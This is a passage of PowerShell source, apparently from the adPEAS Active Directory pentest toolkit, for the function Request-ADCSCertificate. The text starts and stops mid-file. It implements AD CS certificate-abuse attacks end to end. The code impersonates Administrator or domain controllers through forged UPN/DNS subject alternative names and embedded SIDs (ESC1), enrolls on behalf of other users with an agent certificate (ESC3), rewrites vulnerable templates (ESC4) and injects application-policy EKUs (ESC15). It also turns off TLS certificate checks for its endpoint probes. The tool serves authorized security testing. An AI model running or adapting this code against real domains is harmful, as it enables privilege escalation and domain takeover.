    Request-ADCSCertificate -TemplateName "WebServer" -ApplicationPolicies "Client Authentication" -UPN "administrator@contoso.com"
    ESC15 (EKUwu): inject the Client Authentication EKU on a schema-v1 template to get an auth-capable cert as Administrator.

.EXAMPLE
    # ESC15 variant B: turn a schema-v1 cert into an enrollment agent, then chain ESC3
    Request-ADCSCertificate -TemplateName "WebServer" -ApplicationPolicies "Certificate Request Agent" -NoPassword
    Request-ADCSCertificate -TemplateName "User" -OnBehalfOf "CONTOSO\Administrator" -PFX ".\webserver.pfx"

.EXAMPLE
    # ESC3 step 1: enroll for an enrollment-agent certificate
    Request-ADCSCertificate -TemplateName "EnrollmentAgent" -NoPassword -PassThru
    # ESC3 step 2: use the agent cert to request as Administrator on their behalf
    Request-ADCSCertificate -TemplateName "User" -OnBehalfOf "CONTOSO\Administrator" -PFX ".\agent.pfx"
    Enroll-on-behalf-of (ESC3): the agent certificate signs a request for the target principal.

.EXAMPLE
    Request-ADCSCertificate -CAServer "ca01.contoso.com" -TemplateName "User" -UseHTTP -Port 8080
    Requests over plain HTTP on a non-standard certsrv port (no HTTPS attempt).

.EXAMPLE
    Request-ADCSCertificate -RetrieveID 1337 -CAServer "ca01.contoso.com" -KeyFile ".\administrator_req1337.key.json"
    Retrieves a previously pending request after approval and builds the PFX with the saved key.

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding()]
    param(
        [string]$CAServer,

        # Logical CA name (e.g. "CONTOSO-CA01-CA") - required for COM/RPC against an
        # explicit -CAServer; auto-filled from AD discovery otherwise.
        [string]$CAName,

        # Template is mandatory for a new request, but not for -RetrieveID.
        # Validated manually in the body so -RetrieveID can omit it.
        [string]$TemplateName,

        [string]$Impersonate,

        [Alias('SubjectName')]
        [string]$Subject,

        [string]$UPN,

        [string[]]$DNS,

        # Object SID embedded in the NTDS CA Security Extension for strong mapping
        # (required for ESC1/ESC6 impersonation against patched DCs). Auto-resolved
        # from the impersonated identity when omitted and an LDAP session exists.
        [string]$SID,

        # Disable automatic SID resolution/embedding entirely.
        [switch]$NoSID,

        # ESC13/ESC15: inject Microsoft Application Policy OIDs or friendly names
        # (e.g. "Client Authentication", "Certificate Request Agent") into the request.
        [string[]]$ApplicationPolicies,

        [string[]]$AlternativeNames,

        [ValidateSet(1024, 2048, 4096)]
        [int]$KeyLength = 2048,

        # Submission transport: Auto (web first, COM/RPC fallback), Web (certsrv
        # only), or COM (ICertRequest DCOM only).
        [ValidateSet('Auto', 'Web', 'COM')]
        [string]$Method = 'Auto',

        # Custom TCP port for the certsrv Web Enrollment endpoint. 0 = scheme default
        # (80 for HTTP, 443 for HTTPS).
        [ValidateRange(0, 65535)]
        [int]$Port = 0,

        # Retrieve a previously submitted (pending/issued) request by ID and pair it
        # with the saved private key (see -KeyFile) into a PFX.
        [int]$RetrieveID,

        # Path to the *.key.json sidecar written for a pending request.
        [string]$KeyFile,

        # ESC3: request a certificate on behalf of this principal (DOMAIN\user) using
        # an enrollment-agent certificate supplied via -PFX. The agent cert must hold
        # the Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1).
        [string]$OnBehalfOf,

        # Path or Base64 of the enrollment-agent PKCS#12/PFX (cert + private key) used
        # to sign the -OnBehalfOf request.
        [string]$PFX,

        # Password for the -PFX enrollment-agent certificate.
        [string]$PFXPassword,

        [string]$OutputPath,

        [PSCredential]$Credential,

        [string]$Domain,
        [string]$Server,

        [switch]$ModifyTemplate,
        [switch]$UseHTTP,
        [switch]$NoPassword,
        [switch]$PassThru,
        [switch]$Force
    )

    process {
        $FunctionPrefix = "[Request-ADCSCertificate]"

        $isRetrieve = $PSBoundParameters.ContainsKey('RetrieveID')

        # Validate mandatory parameters depending on mode
        if (-not $isRetrieve -and [string]::IsNullOrEmpty($TemplateName)) {
            Write-Warning "[!] -TemplateName is required for a new certificate request."
            return $null
        }

        # === Retrieve mode: pick up a previously submitted request ===
        if ($isRetrieve) {
            return Invoke-ADCSRetrieve -RetrieveID $RetrieveID -KeyFile $KeyFile `
                -CAServer $CAServer -Credential $Credential -UseHTTP:$UseHTTP -Port $Port `
                -OutputPath $OutputPath -NoPassword:$NoPassword -PassThru:$PassThru -Force:$Force
        }

        # === Validate / load enroll-on-behalf-of (ESC3) agent certificate ===
        $oboAgentCert = $null
        if ($OnBehalfOf) {
            if ([string]::IsNullOrEmpty($PFX)) {
                Write-Warning "[!] -OnBehalfOf requires -PFX (enrollment-agent certificate + private key)."
                return $null
            }
            Write-Log "$FunctionPrefix Enroll-on-behalf-of mode for '$OnBehalfOf', loading agent certificate from '$PFX'"

            try {
                if (Test-Path -LiteralPath $PFX) {
                    $pfxBytesIn = [System.IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $PFX).Path)
                }
                else {
                    $pfxBytesIn = [Convert]::FromBase64String(($PFX -replace '\s', ''))
                }
            }
            catch {
                Write-Warning "[!] Failed to read -PFX '$PFX' (not a valid file path or Base64): $_"
                return $null
            }

            try {
                $pfxPwdIn = if ($PSBoundParameters.ContainsKey('PFXPassword')) { $PFXPassword } else { $null }
                $oboAgentCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 `
                    -ArgumentList ([byte[]]$pfxBytesIn), $pfxPwdIn, ([System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
            }
            catch {
                Write-Warning "[!] Failed to load agent certificate from -PFX (wrong password?): $_"
                return $null
            }

            if (-not $oboAgentCert.HasPrivateKey) {
                Write-Warning "[!] Agent certificate has no associated private key - cannot sign the on-behalf-of request."
                return $null
            }

            # Inform whether the agent cert advertises the Certificate Request Agent EKU
            $hasAgentEku = $false
            foreach ($ext in $oboAgentCert.Extensions) {
                if ($ext -is [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension]) {
                    foreach ($eku in $ext.EnhancedKeyUsages) {
                        if ($eku.Value -eq '1.3.6.1.4.1.311.20.2.1') { $hasAgentEku = $true }
                    }
                }
            }
            if ($hasAgentEku) {
                Show-Line "Loaded enrollment-agent certificate '$($oboAgentCert.Subject)' (Certificate Request Agent EKU present)" -Class Note
            }
            else {
                Show-Line "Agent certificate '$($oboAgentCert.Subject)' does NOT advertise the Certificate Request Agent EKU - the CA may reject the request" -Class Hint
            }
        }

        # === Step 1: Determine CA Server ===
        # Tracks ordered list of CAs to try (for fallback)
        $candidateCAs = @()

        if ($CAServer) {
            # Explicit CA server - single candidate, no discovery needed.
            # Name carries the logical CA name (needed for COM/RPC); when -CAName is
            # not supplied it stays empty and only the Web method is available.
            Write-Log "$FunctionPrefix Explicit CA server '$CAServer' (CAName='$CAName')"
            $candidateCAs = @([PSCustomObject]@{
                Name            = $CAName
                DNSHostName     = $CAServer
                CertificateTemplates = @()
                _Explicit       = $true
            })
        }
        else {
            Write-Log "$FunctionPrefix No CA server specified, attempting auto-discovery"

            # Build connection params for LDAP queries
            $connectionParams = @{}
            if ($Domain) { $connectionParams['Domain'] = $Domain }
            if ($Server) { $connectionParams['Server'] = $Server }

            # Check LDAP connection - we only need it for read-only CA discovery.
            # If Ensure-LDAPConnection fails (e.g. TGT mismatch) but $Script:LdapConnection
            # still exists, proceed anyway - the LDAP session itself may still work.
            if (-not (Ensure-LDAPConnection @connectionParams)) {
                if (-not $Script:LdapConnection) {
                    Write-Warning "[!] LDAP connection required for CA auto-discovery. Use Connect-adPEAS first or specify -CAServer."
                    return $null
                }
                Write-Log "$FunctionPrefix Ensure-LDAPConnection reported issues but LDAP session exists, attempting CA discovery anyway"
            }

            # Discover all CAs from Active Directory
            # Pass explicit Domain/Server from session context so Get-CertificateAuthority's
            # internal Ensure-LDAPConnection takes the explicit-params path (no TGT re-check,
            # no duplicate error output)
            $caQueryParams = @{}
            if ($Domain) {
                $caQueryParams['Domain'] = $Domain
            } elseif ($Script:LDAPContext -and $Script:LDAPContext['Domain']) {
                $caQueryParams['Domain'] = $Script:LDAPContext['Domain']
            }
            if ($Server) {
                $caQueryParams['Server'] = $Server
            } elseif ($Script:LDAPContext -and $Script:LDAPContext['Server']) {
                $caQueryParams['Server'] = $Script:LDAPContext['Server']
            }
            $allCAs = @(Get-CertificateAuthority @caQueryParams | Where-Object { -not $_._QueryError })
            if ($allCAs.Count -eq 0) {
                Write-Warning "[!] No Certificate Authorities found in Active Directory. Specify -CAServer manually."
                return $null
            }

            # Log all discovered CAs and their templates
            Show-Line "Found $($allCAs.Count) Certificate Authority(ies) in Active Directory" -Class Note
            foreach ($ca in $allCAs) {
                $templateCount = @($ca.CertificateTemplates).Count
                Write-Verbose "$FunctionPrefix CA '$($ca.Name)' ($($ca.DNSHostName)) - $templateCount published template(s)"
                foreach ($tmpl in ($ca.CertificateTemplates | Sort-Object)) {
                    Write-Verbose "$FunctionPrefix   - $tmpl"
                }
            }

            # Filter CAs that publish the requested template
            $matchingCAs = @($allCAs | Where-Object { $_.CertificateTemplates -contains $TemplateName })

            if ($matchingCAs.Count -eq 0) {
                Write-Warning "[!] Template '$TemplateName' is not published on any CA"
                $allTemplates = @($allCAs | ForEach-Object { $_.CertificateTemplates } | Sort-Object -Unique)
                if ($allTemplates.Count -gt 0) {
                    Show-Line "Available templates across all CAs:"
                    foreach ($tmpl in $allTemplates) {
                        Show-Line "  - $tmpl"
                    }
                }
                return $null
            }

            # Filter CAs with valid DNS hostname
            $candidateCAs = @($matchingCAs | Where-Object { $_.DNSHostName })
            if ($candidateCAs.Count -eq 0) {
                Write-Warning "[!] CAs publishing '$TemplateName' have no DNS hostname. Specify -CAServer manually."
                return $null
            }

            if ($candidateCAs.Count -gt 1) {
                Show-Line "$($candidateCAs.Count) CAs publish template '$TemplateName' - will try in order with automatic fallback:" -Class Note
                foreach ($ca in $candidateCAs) {
                    Show-Line "  - $($ca.Name) ($($ca.DNSHostName))"
                }
            }
            else {
                Show-Line "Auto-discovered CA: $($candidateCAs[0].Name) ($($candidateCAs[0].DNSHostName))" -Class Note
            }
        }

        # === Step 1b: Select a CA and submission method ===
        # For each candidate, determine the usable transport:
        #   - Web : /certsrv/ reachable (probed HTTPS first, then HTTP)
        #   - COM : ICertRequest DCOM, usable whenever the logical CA name is known
        # -Method controls which transports are eligible:
        #   Auto -> Web preferred, COM fallback when web enrollment is absent
        #   Web  -> Web only
        #   COM  -> COM only (no /certsrv/ probing; requires the CA name)
        $CAServer = $null
        $resolvedCAName = $null
        $resolvedMethod = $null
        $resolvedUseHTTP = $UseHTTP.IsPresent
        $lastError = $null

        $webEligible = ($Method -eq 'Auto' -or $Method -eq 'Web')
        $comEligible = ($Method -eq 'Auto' -or $Method -eq 'COM')

        # Build protocol list: -UseHTTP means only HTTP, otherwise try HTTPS then HTTP
        $protocolsToTry = if ($UseHTTP) { @('http') } else { @('https', 'http') }

        foreach ($candidateCA in $candidateCAs) {
            $testHost = $candidateCA.DNSHostName
            $candidateCAName = $candidateCA.Name
            $caSelected = $false

            # --- Try Web enrollment reachability ---
            if ($webEligible) {
                $portPart = if ($Port -gt 0) { ":$Port" } else { "" }
                foreach ($protocol in $protocolsToTry) {
                    $testUrl = "${protocol}://${testHost}${portPart}/certsrv/"
                    Write-Log "$FunctionPrefix Probing Web Enrollment endpoint: $testUrl"

                    try {
                        $testRequest = [System.Net.HttpWebRequest]::Create($testUrl)
                        $testRequest.Method = 'HEAD'
                        $testRequest.Timeout = 5000
                        $testRequest.AllowAutoRedirect = $true

                        # Temporarily ignore SSL errors for reachability check
                        $origCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback
                        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

                        if ($Credential) {
                            $testRequest.Credentials = $Credential.GetNetworkCredential()
                        }
                        else {
                            $testRequest.UseDefaultCredentials = $true
                        }

                        $testResponse = $null
                        try {
                            $testResponse = $testRequest.GetResponse()
                            $statusCode = [int]$testResponse.StatusCode
                        }
                        catch [System.Net.WebException] {
                            $webEx = $_.Exception
                            if ($webEx.Response) {
                                $statusCode = [int]$webEx.Response.StatusCode
                                try { $webEx.Response.Close() } catch { }
                                try { $webEx.Response.Dispose() } catch { }
                            }
                            else {
                                throw
                            }
                        }
                        finally {
                            if ($testResponse) {
                                try { $testResponse.Close() } catch { }
                                try { $testResponse.Dispose() } catch { }
                            }
                            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $origCallback
                        }

                        # 200/301/302/401/403 all mean the endpoint exists and is reachable
                        if ($statusCode -in @(200, 301, 302, 401, 403)) {
                            $CAServer = $testHost
                            $resolvedCAName = $candidateCAName
                            $resolvedMethod = 'Web'
                            $resolvedUseHTTP = ($protocol -eq 'http')
                            Write-Log "$FunctionPrefix Web Enrollment reachable: $testUrl (HTTP $statusCode) -> method=Web"
                            if ($protocol -eq 'http' -and -not $UseHTTP) {
                                Show-Line "HTTPS not available on '$testHost', falling back to HTTP" -Class Hint
                            }
                            $caSelected = $true
                            break
                        }
                        else {
                            $lastError = "HTTP $statusCode"
                            Write-Log "$FunctionPrefix Web Enrollment returned unexpected status: $testUrl - HTTP $statusCode"
                        }
                    }
                    catch {
                        $lastError = $_.Exception.Message
                        Write-Log "$FunctionPrefix Web Enrollment unreachable: $testUrl - $lastError"
                    }
                }
            }

            if ($caSelected) { break }

            # --- Fall back to COM/RPC for this CA (needs the logical CA name) ---
            if ($comEligible) {
                if ($candidateCAName) {
                    $CAServer = $testHost
                    $resolvedCAName = $candidateCAName
                    $resolvedMethod = 'COM'
                    if ($webEligible) {
                        Show-Line "Web Enrollment unavailable on '$testHost', using COM/RPC (ICertRequest) instead" -Class Hint
                    }
                    Write-Log "$FunctionPrefix Selected COM/RPC for CA '$candidateCAName' on '$testHost'"
                    $caSelected = $true
                    break
                }
                else {
                    $lastError = "COM/RPC requires the logical CA name (use -CAName)"
                    Write-Log "$FunctionPrefix Cannot use COM/RPC for '$testHost' - CA name unknown"
                }
            }

            # Nothing worked for this candidate
            if ($candidateCAs.Count -gt 1 -or -not $candidateCA._Explicit) {
                Show-Line "CA '$($candidateCA.Name)' ($testHost) not usable ($Method) - trying next CA" -Class Note
            }
        }

        if (-not $CAServer) {
            if ($Method -eq 'COM') {
                Write-Warning "[!] No CA usable via COM/RPC. Ensure the logical CA name is known (use -CAName with -CAServer). Last error: $lastError"
            }
            elseif ($candidateCAs.Count -eq 1 -and $candidateCAs[0]._Explicit) {
                Write-Warning "[!] Cannot reach CA server '$($candidateCAs[0].DNSHostName)': $lastError"
            }
            else {
                Write-Warning "[!] None of the $($candidateCAs.Count) candidate CAs are usable (method '$Method'). Last error: $lastError"
            }
            return $null
        }

        Show-Line "Requesting certificate from CA '$CAServer' (method: $resolvedMethod) using template '$TemplateName'" -Class Note

        # === Step 1c: ModifyTemplate - Backup and modify template (ESC4) ===
        $templateBackupPath = $null
        $templateModified = $false

        if ($ModifyTemplate) {
            # Build connection params for Set-CertificateTemplate
            $templateParams = @{}
            if ($Domain) { $templateParams['Domain'] = $Domain }
            if ($Server) { $templateParams['Server'] = $Server }

            # Ensure LDAP connection for template operations
            if (-not (Ensure-LDAPConnection @templateParams)) {
                Write-Warning "[!] LDAP connection required for -ModifyTemplate. Use Connect-adPEAS first."
                return $null
            }

            # Backup template before modification
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $templateBackupPath = "${TemplateName}_backup_${timestamp}.json"

            Show-Line "Backing up template '$TemplateName' before modification" -Class Note
            try {
                Set-CertificateTemplate -Identity $TemplateName -Export $templateBackupPath @templateParams
            }
            catch {
                Write-Warning "[!] Failed to backup template: $_"
                return $null
            }

            if (-not (Test-Path -Path $templateBackupPath)) {
                Write-Warning "[!] Template backup file was not created. Aborting to prevent data loss."
                return $null
            }

            Show-Line "Template backup saved to: $templateBackupPath" -Class Hint

            # Modify template for ESC1 exploitation
            Show-Line "Modifying template '$TemplateName' for certificate request" -Class Note
            try {
                Set-CertificateTemplate -Identity $TemplateName `
                    -AllowEnrolleeSuppliesSubject `
                    -AddClientAuthentication `
                    -AllowExportableKey `
                    -RemoveManagerApproval `
                    @templateParams -Confirm:$false

                $templateModified = $true
                Show-Line "Template modified successfully (ENROLLEE_SUPPLIES_SUBJECT, Client Auth EKU, Exportable Key, No Manager Approval)" -Class Hint
            }
            catch {
                # Permission pre-check failure: no changes were made, skip restore
                if ("$_" -match "Insufficient permissions to modify template") {
                    return $null
                }

                # Other errors: changes may have been partially applied, attempt restore
                Write-Warning "[!] Failed to modify template: $_"
                Show-Line "Attempting to restore original template from backup" -Class Note
                try {
                    Set-CertificateTemplate -Identity $TemplateName -Import $templateBackupPath @templateParams -Confirm:$false
                    Show-Line "Original template restored successfully" -Class Hint
                }
                catch {
                    Write-Warning "[!] CRITICAL: Failed to restore template! Manual restore required from: $templateBackupPath"
                }
                return $null
            }
        }

        # Wrap remaining steps in try/finally to ensure template restore on any failure
        try {
            # === Step 2: Resolve Subject and SAN parameters ===
            # Priority: -Impersonate > -Subject/-UPN/-DNS > -AlternativeNames > defaults
            $resolvedSubjectDN = $null
            $resolvedSANs = @()

            # Get domain suffix from session for UPN construction
            $sessionDomain = $null
            if ($Script:LDAPContext -and $Script:LDAPContext['Domain']) {
                $sessionDomain = $Script:LDAPContext['Domain']
            }

            if ($Impersonate) {
                # -Impersonate: derive Subject and SAN from a single value
                # Detection: UPN (has @), FQDN (has dots like srv-dc.contoso.com), or simple name
                if ($Impersonate -match '@') {
                    # Full UPN provided: "administrator@contoso.com"
                    $impersonateUPN = $Impersonate
                    $impersonateUser = ($Impersonate -split '@')[0]
                    $resolvedSubjectDN = "CN=$impersonateUser"
                    $resolvedSANs = @("UPN:$impersonateUPN")
                    Write-Log "$FunctionPrefix Impersonate resolved as UPN: Subject=$resolvedSubjectDN, UPN=$impersonateUPN"
                }
                elseif ($Impersonate -match '^[^@]+\.[^@]+\.[^@]+$') {
                    # FQDN format: "srv-dc.contoso.com" (at least two dots, no @)
                    # Computer certificates use DNS SAN, not UPN
                    $hostPart = ($Impersonate -split '\.')[0]
                    $resolvedSubjectDN = "CN=$hostPart"
                    $resolvedSANs = @("DNS:$Impersonate")
                    Write-Log "$FunctionPrefix Impersonate resolved as DNS (FQDN): Subject=$resolvedSubjectDN, DNS=$Impersonate"
                }
                else {
                    # Simple username: "administrator" or short hostname: "srv-dc"
                    $impersonateUser = $Impersonate
                    if ($sessionDomain) {
                        $impersonateUPN = "$Impersonate@$sessionDomain"
                    }
                    elseif ($Domain) {
                        $impersonateUPN = "$Impersonate@$Domain"
                    }
                    else {
                        Write-Warning "[!] Cannot determine domain for UPN. Use full UPN format (user@domain.com) or connect to a domain first."
                        return $null
                    }
                    $resolvedSubjectDN = "CN=$impersonateUser"
                    $resolvedSANs = @("UPN:$impersonateUPN")
                    Write-Log "$FunctionPrefix Impersonate resolved as UPN: Subject=$resolvedSubjectDN, UPN=$impersonateUPN"
                }
            }
            else {
                # Resolve Subject
                if ($Subject) {
                    # Auto-add CN= prefix if no RDN type present
                    if ($Subject -notmatch '^\s*(CN|O|OU|C|ST|L|DC|E)\s*=') {
                        $resolvedSubjectDN = "CN=$Subject"
                    }
                    else {
                        $resolvedSubjectDN = $Subject
                    }
                }
                elseif ($UPN) {
                    # -UPN specified without -Subject: derive CN from UPN (username part)
                    # ESC1 pattern for user impersonation:
                    #   -UPN administrator@contoso.com  ->  Subject: CN=administrator
                    $upnUser = ($UPN -split '@')[0]
                    $resolvedSubjectDN = "CN=$upnUser"
                    Write-Log "$FunctionPrefix No -Subject specified, derived from -UPN: $resolvedSubjectDN"
                }
                elseif ($DNS) {
                    # -DNS specified without -Subject: derive CN from first DNS name (hostname part)
                    # ESC1 pattern for computer account impersonation:
                    #   -DNS srv-dc.contoso.com  ->  Subject: CN=srv-dc
                    $firstDNS = $DNS[0]
                    $hostPart = ($firstDNS -split '\.')[0]
                    $resolvedSubjectDN = "CN=$hostPart"
                    Write-Log "$FunctionPrefix No -Subject specified, derived from -DNS: $resolvedSubjectDN"
                }
                elseif ($OnBehalfOf) {
                    # ESC3: inner CSR subject = CN of the on-behalf-of user (domain stripped)
                    $oboUser = $OnBehalfOf
                    if ($oboUser -match '\\(.+)$') { $oboUser = $Matches[1] }
                    $resolvedSubjectDN = "CN=$oboUser"
                    Write-Log "$FunctionPrefix No -Subject specified, derived from -OnBehalfOf: $resolvedSubjectDN"
                }
                else {
                    # Default: current user from session
                    $currentUser = $null
                    if ($Script:LDAPContext -and $Script:LDAPContext['Username']) {
                        $currentUser = $Script:LDAPContext['Username']
                        if ($currentUser -match '\\(.+)$') {
                            $currentUser = $Matches[1]
                        }
                    }
                    if (-not $currentUser) {
                        $currentUser = [Environment]::UserName
                    }
                    $resolvedSubjectDN = "CN=$currentUser"
                }

                # Resolve SANs: -UPN, -DNS, and -AlternativeNames are additive
                if ($UPN) {
                    # Auto-append domain if UPN has no @ suffix
                    $resolvedUPN = $UPN
                    if ($resolvedUPN -notmatch '@') {
                        $upnDomain = if ($sessionDomain) { $sessionDomain } elseif ($Domain) { $Domain } else { $null }
                        if ($upnDomain) {
                            $resolvedUPN = "$UPN@$upnDomain"
                            Write-Log "$FunctionPrefix Auto-appended domain to UPN: $resolvedUPN"
                        }
                        else {
                            Write-Warning "[!] UPN '$UPN' has no domain suffix and no domain context available. Use full UPN format (user@domain.com)."
                            return $null
                        }
                    }
                    $resolvedSANs += "UPN:$resolvedUPN"
                }
                if ($DNS) {
                    foreach ($dnsName in $DNS) {
                        $resolvedSANs += "DNS:$dnsName"
                    }
                }
                if ($AlternativeNames) {
                    $resolvedSANs += $AlternativeNames
                }
            }

            Write-Log "$FunctionPrefix Subject: $resolvedSubjectDN"
            if ($resolvedSANs.Count -gt 0) {
                Write-Log "$FunctionPrefix SANs: $($resolvedSANs -join ', ')"
            }

            # Footgun guard: -Subject is literal (it only sets the DN). AD maps
            # certificates via the SAN (UPN/DNS) + SID, not the Subject DN. If the
            # Subject looks like a UPN or FQDN but no SAN was supplied, the issued
            # certificate will not map to that principal - warn and point to -UPN/-DNS/-Impersonate.
            if ($resolvedSANs.Count -eq 0 -and -not $OnBehalfOf) {
                $cnValue = if ($resolvedSubjectDN -match 'CN=([^,]+)') { $Matches[1].Trim() } else { '' }
                if ($cnValue -match '@') {
                    Show-Line "Subject '$cnValue' looks like a UPN but no SAN was set - the certificate will NOT map to that user. Use -UPN or -Impersonate for impersonation." -Class Finding
                }
                elseif ($cnValue -match '^[^@\s]+\.[^@\s]+$') {
                    Show-Line "Subject '$cnValue' looks like a DNS/FQDN but no SAN was set - the certificate will NOT map to that host. Use -DNS or -Impersonate." -Class Finding
                }
            }

            # === Step 2b: Resolve the SID for strong certificate mapping ===
            # On DCs with StrongCertificateBindingEnforcement (KB5014754, mandatory
            # since Feb 2025) the issued certificate must carry the target principal's
            # SID in the NTDS CA Security Extension, otherwise PKINIT mapping fails.
            $resolvedSID = $null
            if ($NoSID) {
                Write-Log "$FunctionPrefix -NoSID specified, skipping SID extension"
            }
            elseif ($SID) {
                $resolvedSID = $SID
                Write-Log "$FunctionPrefix Using explicit -SID: $resolvedSID"
            }
            else {
                # Derive the identity whose SID we should embed.
                # For on-behalf-of, the issued cert belongs to that principal.
                $sidTargetIdentity = $null
                $upnSan = $resolvedSANs | Where-Object { $_ -match '^UPN:' } | Select-Object -First 1
                $dnsSan = $resolvedSANs | Where-Object { $_ -match '^DNS:' } | Select-Object -First 1
                if ($OnBehalfOf) {
                    $sidTargetIdentity = $OnBehalfOf
                }
                elseif ($upnSan) {
                    $sidTargetIdentity = ($upnSan -split ':', 2)[1]
                }
                elseif ($dnsSan) {
                    # Computer account: sAMAccountName is "<hostname>$"
                    $dnsValue = ($dnsSan -split ':', 2)[1]
                    $sidTargetIdentity = "$(($dnsValue -split '\.')[0])`$"
                }
                elseif ($resolvedSubjectDN -match 'CN=([^,]+)') {
                    $sidTargetIdentity = $Matches[1].Trim()
                }

                if ($sidTargetIdentity -and $Script:LdapConnection) {
                    Write-Log "$FunctionPrefix Attempting SID auto-resolution for '$sidTargetIdentity'"
                    try {
                        $resolvedSID = ConvertTo-SID -Identity $sidTargetIdentity
                    }
                    catch {
                        Write-Log "$FunctionPrefix SID auto-resolution threw: $_"
                    }
                    if ($resolvedSID) {
                        Show-Line "Auto-resolved SID for '$sidTargetIdentity': $resolvedSID (embedding NTDS CA Security Extension for strong mapping)" -Class Hint
                    }
                    else {
                        Show-Line "Could not resolve a SID for '$sidTargetIdentity'. On patched DCs the certificate may not map - supply -SID explicitly, or use -NoSID to silence this." -Class Hint
                    }
                }
                elseif (-not $Script:LdapConnection) {
                    Write-Log "$FunctionPrefix No LDAP session for SID auto-resolution; supply -SID for strong mapping"
                }
            }

            # === Step 3: Generate CSR ===
            $csrResult = $null
            try {
                $csrParams = @{
                    SubjectDN = $resolvedSubjectDN
                    KeyLength = $KeyLength
                }
                if ($resolvedSANs.Count -gt 0) {
                    $csrParams['AlternativeNames'] = $resolvedSANs
                }
                if ($resolvedSID) {
                    $csrParams['SID'] = $resolvedSID
                }
                if ($ApplicationPolicies -and $ApplicationPolicies.Count -gt 0) {
                    $csrParams['ApplicationPolicies'] = $ApplicationPolicies
                }
                $csrResult = New-PKCS10Request @csrParams
            }
            catch {
                Write-Warning "[!] Failed to generate CSR: $_"
                return $null
            }

            Show-Line "Generated $KeyLength-bit RSA key pair and PKCS#10 CSR" -Class Note

            $rsa = $csrResult.RSAKey
            try {
                # === Step 3b: Wrap into a PKCS#7 enroll-on-behalf-of envelope (ESC3) ===
                # The submission payload is the bare CSR unless on-behalf-of, in which
                # case it is a SignedData envelope signed by the agent certificate.
                $submissionBase64 = $csrResult.CSRBase64
                $submissionIsPKCS7 = $false
                if ($OnBehalfOf) {
                    Show-Line "Wrapping request as enroll-on-behalf-of '$OnBehalfOf' (signed by agent certificate)" -Class Note
                    $p7Base64 = New-EnrollOnBehalfOfRequest -InnerCsrDer $csrResult.CSRBytes `
                        -OnBehalfOf $OnBehalfOf -AgentCert $oboAgentCert
                    if (-not $p7Base64) {
                        Write-Warning "[!] Failed to build the on-behalf-of request."
                        return $null
                    }
                    $submissionBase64 = $p7Base64
                    $submissionIsPKCS7 = $true
                }

                # === Step 4: Submit CSR to CA via the selected transport ===
                $submitResult = $null

                if ($resolvedMethod -eq 'COM') {
                    # COM/RPC was selected directly (web absent or -Method COM)
                    Write-Log "$FunctionPrefix Submitting via COM/RPC to CA '$resolvedCAName'"
                    $comResult = Submit-COMRequest -CAServer $CAServer `
                        -CAName $resolvedCAName `
                        -CSRBase64 $submissionBase64 `
                        -TemplateName $TemplateName `
                        -Credential $Credential `
                        -IsPKCS7:$submissionIsPKCS7

                    if ($comResult.Success) {
                        $submitResult = @{
                            Success      = $true
                            Status       = 'Issued'
                            RequestID    = $comResult.RequestID
                            Certificate  = $comResult.Certificate   # X509Certificate2
                            ErrorMessage = $null
                            RawResponse  = $null
                        }
                        Show-Line "Certificate issued via COM/RPC (Request ID: $($comResult.RequestID))" -Class Hint
                    }
                    else {
                        Write-Warning "[!] COM/RPC request failed: $($comResult.ErrorMessage)"
                        return $null
                    }
                }
                else {
                    # Web enrollment (certsrv)
                    Write-Log "$FunctionPrefix Submitting via Web Enrollment (http=$resolvedUseHTTP)"
                    $submitResult = Submit-CertsrvRequest -CAServer $CAServer `
                        -CSRBase64 $submissionBase64 `
                        -TemplateName $TemplateName `
                        -Credential $Credential `
                        -UseHTTP:$resolvedUseHTTP `
                        -Port $Port

                    # Only a genuine TRANSPORT failure triggers the COM/RPC fallback.
                    # Auth/Denied responses are real CA answers, not transport problems,
                    # so they must NOT silently retry over COM.
                    $isTransportFailure = ($submitResult.Status -eq 'Error' -and
                        $submitResult.ErrorMessage -match 'connect|connection|timeout|refused|unreachable')

                    if ($isTransportFailure -and $comEligible -and $resolvedCAName) {
                        Show-Line "Web Enrollment transport error ($($submitResult.ErrorMessage)), attempting COM/RPC fallback..." -Class Hint
                        Write-Log "$FunctionPrefix Web Enrollment transport failure, trying COM/RPC with CA '$resolvedCAName'"

                        $comResult = Submit-COMRequest -CAServer $CAServer `
                            -CAName $resolvedCAName `
                            -CSRBase64 $submissionBase64 `
                            -TemplateName $TemplateName `
                            -Credential $Credential `
                            -IsPKCS7:$submissionIsPKCS7

                        if ($comResult.Success) {
                            $submitResult = @{
                                Success      = $true
                                Status       = 'Issued'
                                RequestID    = $comResult.RequestID
                                Certificate  = $comResult.Certificate   # X509Certificate2
                                ErrorMessage = $null
                                RawResponse  = $null
                            }
                            Show-Line "Certificate issued via COM/RPC fallback (Request ID: $($comResult.RequestID))" -Class Hint
                        }
                        else {
                            Write-Warning "[!] Both Web Enrollment and COM/RPC failed"
                            Write-Warning "[!] Web Enrollment: $($submitResult.ErrorMessage)"
                            Write-Warning "[!] COM/RPC: $($comResult.ErrorMessage)"
                            return $null
                        }
                    }
                    elseif ($submitResult.Status -in @('AuthError', 'Denied', 'Error')) {
                        # Non-recoverable web result (no fallback eligible/possible)
                        if ($isTransportFailure -and -not $resolvedCAName) {
                            Write-Log "$FunctionPrefix Transport failure but no CA name known for COM/RPC fallback (use -CAName)"
                        }
                        Write-Warning "[!] $($submitResult.ErrorMessage)"
                        return $null
                    }
                }

                if ($submitResult.Status -eq 'Pending') {
                    Show-Line "Certificate request is pending approval (Request ID: $($submitResult.RequestID))" -Class Hint
                    Show-Line "The CA administrator must approve this request before the certificate can be retrieved."

                    # Persist the private key so the certificate can be paired into a
                    # PFX after approval via -RetrieveID. Without this the key is lost
                    # when this call returns and the issued certificate is unusable.
                    $savedKeyPath = $null
                    try {
                        $cnForKey = if ($resolvedSubjectDN -match 'CN=([^,]+)') { $Matches[1].Trim() } else { 'certificate' }
                        $savedKeyPath = Save-PendingPrivateKey -RSA $rsa -RequestID $submitResult.RequestID `
